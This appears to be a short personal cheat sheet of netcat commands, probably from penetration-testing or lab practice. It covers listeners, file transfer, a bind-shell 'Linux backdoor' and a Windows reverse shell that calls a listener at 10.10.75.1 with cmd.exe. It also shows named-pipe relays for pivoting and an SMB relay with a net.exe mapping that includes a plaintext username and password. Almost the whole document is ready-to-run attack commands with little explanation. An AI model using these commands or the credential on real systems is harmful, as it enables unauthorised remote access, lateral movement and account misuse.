# Netcat Notes

### Client and listener

```
nc -l -p 2222
nc <IP> <port>
```

### pull a file

```
Get-Content text.txt | nc -l -p 1234
nc <IP> <port> > received.txt
```

### push a file

```
nc -l -p <port> | Out-File -FilePath received2.txt
cat file.txt | nc <IP> <port>
```

### Linux backdoor

```
nc -l -p <port> -e /bin/bash
nc <IP> <port>
```

### Reverse windows shell

```
nc -l -p 8888
nc 10.10.75.1 8888 -e cmd.exe
```


### Relays

```
mkfifo namedpipe
nc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe
```

when above is set up on 172.30.0.50 we can do this, and it will move curl from .50 to .55
```
curl http://172.30.0.50:8080
```

### Relay for SMB

```
mkfifo namedpipe
sudo nc -l -p 445 < namedpipe | nc 172.30.0.22 445 > namedpipe
net.exe use * \\10.10.75.1\data /u:erigby weddingrice
net.exe use
```
